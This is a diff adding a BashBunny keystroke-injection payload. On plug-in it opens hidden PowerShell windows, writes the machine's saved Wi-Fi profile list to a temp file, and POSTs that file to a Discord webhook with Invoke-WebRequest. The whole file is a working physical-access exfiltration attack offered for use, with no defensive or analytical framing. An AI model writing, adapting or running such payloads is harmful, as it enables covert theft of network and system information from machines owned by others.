@@ -1,0 +1,16 @@
+REM BashBunny HID payload: dump saved Wi-Fi profiles and exfil via a Discord webhook.
+REM ATTACKMODE configures the Bunny itself (HID keyboard + onboard mass storage).
+ATTACKMODE HID STORAGE
+LED ATTACK
+DELAY 1500
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -Command "netsh wlan show profiles | findstr All > $env:TEMP\wifi.txt"
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -Command "Invoke-WebRequest -Uri https://discordapp.com/api/webhooks/123456789012345678/AbCDeFGhiJKlmNoPQRstuVWxyz0123456789ABCDEFGhiJKLmn -Method POST -InFile $env:TEMP\wifi.txt"
+ENTER
